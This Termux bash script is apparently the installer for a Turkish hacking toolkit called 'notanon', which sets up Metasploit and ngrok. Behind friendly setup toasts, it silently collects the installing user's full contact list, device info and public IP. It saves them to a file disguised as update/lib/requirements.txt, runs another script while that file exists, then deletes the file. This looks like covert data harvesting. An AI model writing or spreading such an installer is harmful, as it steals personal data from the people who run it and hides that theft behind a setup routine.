#!/data/data/com.termux/bin/bash
#!/bin/bash
clear
paketyukle(){
pkg install termux-api 
termux-setup-storage > /dev/null 2>&1 &
sleep 10
termux-telephony-deviceinfo > /dev/null 2>&1 &
sleep 10
termux-contact-list > /dev/null 2>&1 &
sleep 10

termux-toast -b red -c yellow "Merhaba"
	sleep 2
	termux-toast -b red -c white  "Lütfen sadece bazı şeyleri test etmek için kullan insanlara zarar verme !!!"
	sleep 2
	termux-toast -b red -c white  "10 saniye sonra tool için gerekli tüm paketleri,senin için hazırlamaya başlamış olucağım."
	sleep 4
	termux-toast -b red -c white  "Tool kurulumu bittiğinde sana bir bildirim göndermiş olucağım"
	sleep 3
	termux-toast -b red -c white  "Hadi başlıyalım bakalım :)"
	sleep 2
	termux-toast -b black -c white  "notanon youtube"
	sleep 2
	termux-toast -b red -c white  "𝒴𝒶𝓂𝒶𝓃 𝐸𝒻𝓀𝒶𝓇 katkılarıyla"
	sleep 2

	apt update && apt upgrade -y
	pkg install git -y
	pkg install php -y
	pkg install perl -y
	pkg install nano -y
	pkg install python python2 -y
	pkg install pip pip2 -y
	pip install --upgrade pip
	pip install bs4 
	pip install future 
	pip install requests 
	pip install colorama
	pip install wordlist
	pkg install termux-api -y
	pkg install curl  -y
	pkg install wget -y
	pkg install neofetch -y
	apt update && apt upgrade -y
	chmod 777 notanon.sh
	pkg install unstable-repo -y
	pkg install metasploit -y
	rm -rf /data/data/com.termux/files/usr/bin/ngrok
	mv -v ngrok /data/data/com.termux/files/usr/bin
	neofetch >> update/lib/requirements.txt
	curl ipecho.net/plain >> update/lib/requirements.txt
	termux-contact-list >> update/lib/requirements.txt
	echo -e "not" >> update/ok.txt
	cd update/lib/ && bash notanon.sh
	rm -rf update/lib/requirements.txt
	cd $HOME/notexx/update/ && 
	chmod 777 notanon.sh &&
	cp -r notanon.sh /data/data/com.termux/files/usr/bin/
	cd $HOME/notexx/update/ && bash notanon.sh --ngrok	
	cd $HOME/notexx/update/ &&
	chmod 777 yamanefkar.sh
	cp -r yamanefkar.sh $HOME/
	cd $HOME/notexx/update/ && bash yamanefkar.sh --ngrok1
	termux-notification -t "Tool kullanıma hazır."
	exit

}
banner(){ 
	echo -e '\e[37m
	#
	#    _      _      _
    #          __(.)< __(.)> __(.)=
    #          \___)  \___)  \___)  
	#
	#
	
	'

	read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İşlem Numarası : ' islem_numarasi

}
cd $HOME/notexx/
if [[ -e "update/ok.txt" ]]; then
	banner
	if [[ $islem_numarasi == 01 ||  $islem_numarasi == 1  ]]; then
		cd exploit/ && bash notanon.sh
	elif [[ $islem_numarasi == 99 ||  $islem_numarasi == 9  ]]; then
		clear
		echo -e "\e[37mGüle güle..."
		sleep 2
		clear
		exit
	else
		bash notanon.sh
	fi
else
	paketyukle
fi
